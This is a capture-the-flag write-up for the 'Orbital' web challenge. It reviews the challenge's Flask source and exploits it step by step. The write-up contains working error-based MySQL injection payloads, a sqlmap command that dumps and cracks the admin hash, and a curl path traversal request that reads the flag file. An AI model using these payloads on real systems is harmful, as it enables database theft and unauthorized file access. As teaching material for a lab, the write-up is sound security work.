# Orbital

## Overview

- Overall difficulty for me (From 1-10 stars): ★★★★☆☆☆☆☆☆

## Background

In order to decipher the alien communication that held the key to their location, she needed access to a decoder with advanced capabilities - a decoder that only The Orbital firm possessed. Can you get your hands on the decoder?

![](https://github.com/siunam321/CTF-Writeups/blob/main/Cyber-Apocalypse-2023/images/Pasted%20image%2020230318224918.png)

## Enumeration

**Home page:**

![](https://github.com/siunam321/CTF-Writeups/blob/main/Cyber-Apocalypse-2023/images/Pasted%20image%2020230318225008.png)

In here, we see there's a login page.

Whenever I deal with a login page, I always try SQL injection to bypass the authentication, like `' OR 1=1-- -`:

![](https://github.com/siunam321/CTF-Writeups/blob/main/Cyber-Apocalypse-2023/images/Pasted%20image%2020230318225229.png)

Ahh nope.

**Let's read the [source code](https://github.com/siunam321/CTF-Writeups/blob/main/Cyber-Apocalypse-2023/Web/Orbital/web_orbital.zip)!**
```shell
┌[siunam♥earth]-(~/ctf/Cyber-Apocalypse-2023/Web/Orbital)-[2023.03.18|22:52:45(HKT)]
└> file web_orbital.zip 
web_orbital.zip: Zip archive data, at least v1.0 to extract, compression method=store
┌[siunam♥earth]-(~/ctf/Cyber-Apocalypse-2023/Web/Orbital)-[2023.03.18|22:52:46(HKT)]
└> unzip web_orbital.zip 
Archive:  web_orbital.zip
   creating: web_orbital/
   creating: web_orbital/config/
  inflating: web_orbital/config/supervisord.conf  
  inflating: web_orbital/Dockerfile  
  inflating: web_orbital/build-docker.sh  
 extracting: web_orbital/flag.txt    
   creating: web_orbital/files/
  inflating: web_orbital/files/communication.mp3  
   creating: web_orbital/challenge/
  inflating: web_orbital/challenge/run.py  
   creating: web_orbital/challenge/application/
   creating: web_orbital/challenge/application/blueprints/
  inflating: web_orbital/challenge/application/blueprints/routes.py  
  inflating: web_orbital/challenge/application/config.py  
  inflating: web_orbital/challenge/application/util.py  
  inflating: web_orbital/challenge/application/database.py  
   creating: web_orbital/challenge/application/static/
   creating: web_orbital/challenge/application/static/css/
  inflating: web_orbital/challenge/application/static/css/bootstrap.min.css  
  inflating: web_orbital/challenge/application/static/css/star.css  
  inflating: web_orbital/challenge/application/static/css/style.css  
  inflating: web_orbital/challenge/application/static/css/graph.css  
   creating: web_orbital/challenge/application/static/images/
  inflating: web_orbital/challenge/application/static/images/map.png  
  inflating: web_orbital/challenge/application/static/images/logo.png  
   creating: web_orbital/challenge/application/static/js/
  inflating: web_orbital/challenge/application/static/js/script.js  
  inflating: web_orbital/challenge/application/static/js/dashboard.js  
  inflating: web_orbital/challenge/application/static/js/jquery.js  
   creating: web_orbital/challenge/application/templates/
  inflating: web_orbital/challenge/application/templates/home.html  
  inflating: web_orbital/challenge/application/templates/login.html  
  inflating: web_orbital/challenge/application/main.py  
  inflating: web_orbital/entrypoint.sh
```

**In `entrypoint.sh`, we can see the MySQL database schema:**
```bash
mysql -u root << EOF
CREATE DATABASE orbital;
CREATE TABLE orbital.users (
    id INTEGER PRIMARY KEY AUTO_INCREMENT,
    username varchar(255) NOT NULL UNIQUE,
    password varchar(255) NOT NULL
);
CREATE TABLE orbital.communication (
    id INTEGER PRIMARY KEY AUTO_INCREMENT,
    source varchar(255) NOT NULL,
    destination varchar(255) NOT NULL,
    name varchar(255) NOT NULL,
    downloadable varchar(255) NOT NULL
);
INSERT INTO orbital.users (username, password) VALUES ('admin', '$(genPass)');
INSERT INTO orbital.communication (source, destination, name, downloadable) VALUES ('Titan', 'Arcturus', 'Ice World Calling Red Giant', 'communication.mp3');
INSERT INTO orbital.communication (source, destination, name, downloadable) VALUES ('Andromeda', 'Vega', 'Spiral Arm Salutations', 'communication.mp3');
INSERT INTO orbital.communication (source, destination, name, downloadable) VALUES ('Proxima Centauri', 'Trappist-1', 'Lone Star Linkup', 'communication.mp3');
INSERT INTO orbital.communication (source, destination, name, downloadable) VALUES ('TRAPPIST-1h', 'Kepler-438b', 'Small World Symposium', 'communication.mp3');
INSERT INTO orbital.communication (source, destination, name, downloadable) VALUES ('Winky', 'Boop', 'Jelly World Japes', 'communication.mp3');
CREATE USER 'user'@'localhost' IDENTIFIED BY 'M@k3l@R!d3s$';
GRANT SELECT ON orbital.users TO 'user'@'localhost';
GRANT SELECT ON orbital.communication TO 'user'@'localhost';
FLUSH PRIVILEGES;
EOF
```

**After looking around at the source code, I immediately found a vulnerability in the implementation of JWT (JSON Web Token) in `application/util.py`:**
```py
def verifyJWT(token):
    try:
        token_decode = jwt.decode(
            token,
            key,
            algorithms='HS256'
        )

        return token_decode
    except:
        return abort(400, 'Invalid token!')
```

As you can see, the `verifyJWT()` function is using `jwt.decode()` method instead of `jwt.verify()`!!!

Which means ***it doesn't verify the JWT is being tampered or not by signing a secret!***

**Then, in `application/blueprints/routes.py`, there's a `/login` route (endpoint):**
```py
from flask import Blueprint, render_template, request, session, redirect, send_file
from application.database import login, getCommunication
from application.util import response, isAuthenticated
[...]
@api.route('/login', methods=['POST'])
def apiLogin():
    if not request.is_json:
        return response('Invalid JSON!'), 400
    
    data = request.get_json()
    username = data.get('username', '')
    password = data.get('password', '')
    
    if not username or not password:
        return response('All fields are required!'), 401
    
    user = login(username, password)
    
    if user:
        session['auth'] = user
        return response('Success'), 200
        
    return response('Invalid credentials!'), 403
```

When a POST request with parameter `username` and `password` in JSON format is sent, run function `login()` from `application.database`.

**`login()`:**
```py
from colorama import Cursor
from application.util import createJWT, passwordVerify
from flask_mysqldb import MySQL
[...]
def login(username, password):
    # I don't think it's not possible to bypass login because I'm verifying the password later.
    user = query(f'SELECT username, password FROM users WHERE username = "{username}"', one=True)

    if user:
        passwordCheck = passwordVerify(user['password'], password)

        if passwordCheck:
            token = createJWT(user['username'])
            return token
    else:
        return False
```

In here, we see **the SQL query doesn't use prepare statement, which is vulnerable to SQL injection!!**

However, it only parses the `username`???

Then, if there's result from that SQL query, **it runs function `passwordVerify()`** with the correct password from the database, and the password that we provided.

**`passwordVerify()`:**
```py
def passwordVerify(hashPassword, password):
    md5Hash = hashlib.md5(password.encode())

    if md5Hash.hexdigest() == hashPassword: return True
    else: return False
```

In here, it uses MD5 to hash our provided password.

If the MD5 hash is matched to the correct one, then return `True`.

If `True`, then create a new JWT for the user.

Hmm... It seems like we can't bypass the password check??

**In `applications/blueprints/routes.py`, there're more routes:**
```py
@web.route('/home')
@isAuthenticated
def home():
    allCommunication = getCommunication()
    return render_template('home.html', allCommunication=allCommunication)
[...]
@api.route('/export', methods=['POST'])
@isAuthenticated
def exportFile():
    if not request.is_json:
        return response('Invalid JSON!'), 400
    
    data = request.get_json()
    communicationName = data.get('name', '')

    try:
        # Everyone is saying I should escape specific characters in the filename. I don't know why.
        return send_file(f'/communications/{communicationName}', as_attachment=True)
    except:
        return response('Unable to retrieve the communication'), 400
```

In here, the `/home` will check if we authenticated or not.

Umm... I wonder can I create a new JWT, and go to route `/home` to bypass the authentication...

But nope...

Let's take a step back.

## Exploitation

In `/api/login` route, we found that **the login SQL query doesn't use prepare statement**.

Armed with above information, instead of doing authentication bypass, we can try to exfiltrate data from the database via SQL injection.

**To do so, I'll try to trigger an error:**
```json
{
    "username":"\"",
    "password":"test"
}
```

![](https://github.com/siunam321/CTF-Writeups/blob/main/Cyber-Apocalypse-2023/images/Pasted%20image%2020230319115938.png)

Oh!! We've triggered an SQL syntax error!

**Let's try to supply 2 double quotes:**

![](https://github.com/siunam321/CTF-Writeups/blob/main/Cyber-Apocalypse-2023/images/Pasted%20image%2020230319120015.png)

No error!!

Which means the login api is vulnerable to **Error-based MySQL injection!!**

**Then, according to [PayloadsAllTheThings](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/SQL%20Injection/MySQL%20Injection.md#mysql-error-based---updatexml-function), we can use UpdateXML function to fetch data:**

```sql
AND updatexml(rand(),concat(CHAR(126),version(),CHAR(126)),null)-
AND updatexml(rand(),concat(0x3a,(SELECT concat(CHAR(126),schema_name,CHAR(126)) FROM information_schema.schemata LIMIT data_offset,1)),null)--
AND updatexml(rand(),concat(0x3a,(SELECT concat(CHAR(126),TABLE_NAME,CHAR(126)) FROM information_schema.TABLES WHERE table_schema=data_column LIMIT data_offset,1)),null)--
AND updatexml(rand(),concat(0x3a,(SELECT concat(CHAR(126),column_name,CHAR(126)) FROM information_schema.columns WHERE TABLE_NAME=data_table LIMIT data_offset,1)),null)--
AND updatexml(rand(),concat(0x3a,(SELECT concat(CHAR(126),data_info,CHAR(126)) FROM data_table.data_column LIMIT data_offset,1)),null)--
```

Let's do that!

**Find MySQL version:**
```json
{"username":"\"AND updatexml(rand(),concat(CHAR(126),version(),CHAR(126)),null)-\"","password":"test"}
```

![](https://github.com/siunam321/CTF-Writeups/blob/main/Cyber-Apocalypse-2023/images/Pasted%20image%2020230319122137.png)

- MySQL version: 10.6.12-MariaDB

Since we found the `admin` user is in table `users` from the source code, we can skip the enumerating table and column names process.

**Extract `admin` user data:**
```json
{"username":"\"AND updatexml(rand(),concat(0x3a,(SELECT concat(CHAR(126),username,0x3a,password,CHAR(126)) FROM users LIMIT 0,1)),null)-\"","password":"test"}
```

![](https://github.com/siunam321/CTF-Writeups/blob/main/Cyber-Apocalypse-2023/images/Pasted%20image%2020230319123325.png)

Nice! However, we only got **some password**...

**Hmm... Let's fireup `sqlmap`:**
```shell
┌[siunam♥earth]-(~/ctf/Cyber-Apocalypse-2023/Web/Orbital)-[2023.03.19|12:46:17(HKT)]
└> sqlmap -u http://143.110.160.221:30809/api/login --data='{"username":"test","password":"test"}' --dbms=MySQL --batch -D orbital -T users --dump
[..]
JSON data found in POST body. Do you want to process it? [Y/n/q] Y
[12:46:35] [INFO] testing connection to the target URL
[12:46:36] [WARNING] the web server responded with an HTTP error code (403) which could interfere with the results of the tests
sqlmap resumed the following injection point(s) from stored session:
---
Parameter: JSON username ((custom) POST)
    Type: error-based
    Title: MySQL >= 5.0 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (FLOOR)
    Payload: {"username":"test"="test" AND (SELECT 2688 FROM(SELECT COUNT(*),CONCAT(0x71716b7171,(SELECT (ELT(2688=2688,1))),0x7176786b71,FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.PLUGINS GROUP BY x)a) AND "test"="test","password":"test"}

    Type: time-based blind
    Title: MySQL >= 5.0.12 AND time-based blind (query SLEEP)
    Payload: {"username":"test"="test" AND (SELECT 6499 FROM (SELECT(SLEEP(5)))VFpT) AND "test"="test","password":"test"}
---
[12:46:36] [INFO] testing MySQL
[12:46:36] [INFO] confirming MySQL
[12:46:36] [WARNING] potential permission problems detected ('command denied')
[12:46:36] [INFO] the back-end DBMS is MySQL
back-end DBMS: MySQL >= 5.0.0 (MariaDB fork)
[12:46:36] [INFO] fetching columns for table 'users' in database 'orbital'
[12:46:37] [INFO] retrieved: 'id'
[12:46:37] [INFO] retrieved: 'int(11)'
[12:46:38] [INFO] retrieved: 'username'
[12:46:38] [INFO] retrieved: 'varchar(255)'
[12:46:39] [INFO] retrieved: 'password'
[12:46:39] [INFO] retrieved: 'varchar(255)'
[12:46:39] [INFO] fetching entries for table 'users' in database 'orbital'
[12:46:40] [INFO] retrieved: '1'
[12:46:40] [INFO] retrieved: '1692b753c031f2905b89e7258dbc49bb'
[12:46:41] [INFO] retrieved: 'admin'
[12:46:41] [INFO] recognized possible password hashes in column 'password'
do you want to store hashes to a temporary file for eventual further processing with other tools [y/N] N
do you want to crack them via a dictionary-based attack? [Y/n/q] Y
[12:46:41] [INFO] using hash method 'md5_generic_passwd'
what dictionary do you want to use?
[1] default dictionary file '/usr/share/sqlmap/data/txt/wordlist.tx_' (press Enter)
[2] custom dictionary file
[3] file with list of dictionary files
> 1
[12:46:41] [INFO] using default dictionary
do you want to use common password suffixes? (slow!) [y/N] N
[12:46:41] [INFO] starting dictionary-based cracking (md5_generic_passwd)
[12:46:41] [INFO] starting 4 processes 
[12:46:43] [INFO] cracked password 'ichliebedich' for user 'admin'                                                                                                                                                 
Database: orbital                                                                                                                                                                                                  
Table: users
[1 entry]
+----+-------------------------------------------------+----------+
| id | password                                        | username |
+----+-------------------------------------------------+----------+
| 1  | 1692b753c031f2905b89e7258dbc49bb (ichliebedich) | admin    |
+----+-------------------------------------------------+----------+
```

`sqlmap` found the password and cracked the MD5 hash!

**That being said, we can login with `admin:ichliebedich`!**

![](https://github.com/siunam321/CTF-Writeups/blob/main/Cyber-Apocalypse-2023/images/Pasted%20image%2020230319124934.png)

![](https://github.com/siunam321/CTF-Writeups/blob/main/Cyber-Apocalypse-2023/images/Pasted%20image%2020230319125054.png)

![](https://github.com/siunam321/CTF-Writeups/blob/main/Cyber-Apocalypse-2023/images/Pasted%20image%2020230319124946.png)

Boom! I'm in!

**Now, do you still remember there's a route called `/export`?**
```py
@api.route('/export', methods=['POST'])
@isAuthenticated
def exportFile():
    if not request.is_json:
        return response('Invalid JSON!'), 400
    
    data = request.get_json()
    communicationName = data.get('name', '')

    try:
        # Everyone is saying I should escape specific characters in the filename. I don't know why.
        return send_file(f'/communications/{communicationName}', as_attachment=True)
    except:
        return response('Unable to retrieve the communication'), 400
```

**In the home page, we see this:**

![](https://github.com/siunam321/CTF-Writeups/blob/main/Cyber-Apocalypse-2023/images/Pasted%20image%2020230319125222.png)

Let's try to export one!

![](https://github.com/siunam321/CTF-Writeups/blob/main/Cyber-Apocalypse-2023/images/Pasted%20image%2020230319125244.png)

We downloaded a MP3 file.

In that route, if the request method is POST, then it checks the request body is JSON or not.

After that, it'll get key `name`'s value (`communicationName`).

Finally, it'll send us a file from `/communications/{communicationName}`.

Since there's no validation to check ***path travsal***, we can try to get the flag!

**But first, let's look at the web application's file structure:**
```shell
┌[siunam♥earth]-(~/ctf/Cyber-Apocalypse-2023/Web/Orbital/web_orbital)-[2023.03.19|12:52:56(HKT)]
└> ls -lah files/communication.mp3
-rw-r--r-- 1 siunam nam 111K Mar 14 21:15 files/communication.mp3
```

As you can see, the `communication.mp3` is in `/communications/files/`.

**Then, in `Dockerfile`, we see where does the flag lives:**
```bash
# copy flag
COPY flag.txt /signal_sleuth_firmware
COPY files /communications/
```

**That being said, we can download the flag via `../../../signal_sleuth_firmware`:**
```shell
┌[siunam♥earth]-(~/ctf/Cyber-Apocalypse-2023/Web/Orbital)-[2023.03.19|13:00:17(HKT)]
└> curl http://143.110.160.221:30809/api/export --cookie "session=eyJhdXRoIjoiZXlKaGJHY2lPaUpJVXpJMU5pSXNJblI1Y0NJNklrcFhWQ0o5LmV5SjFjMlZ5Ym1GdFpTSTZJbUZrYldsdUlpd2laWGh3SWpveE5qYzVNakl5T1RjMGZRLldDNTFaRmd5ZjE2cUVaZ3VtN29qbVJyWVRHb0F3Ni1Wbnd3eGQwbGFTN2MifQ.ZBaUXg.Raqq6_Z94_wxwrORI5bOTm99cPw" -d '{"name":"../../../signal_sleuth_firmware"}' -H 'Content-Type: application/json'
HTB{T1m3_b4$3d_$ql1_4r3_fun!!!}
```

Nice!

- **Flag: `HTB{T1m3_b4$3d_$ql1_4r3_fun!!!}`**

## Conclusion

What we've learned:

1. Exploiting Error-Based/Time-Based SQL Injection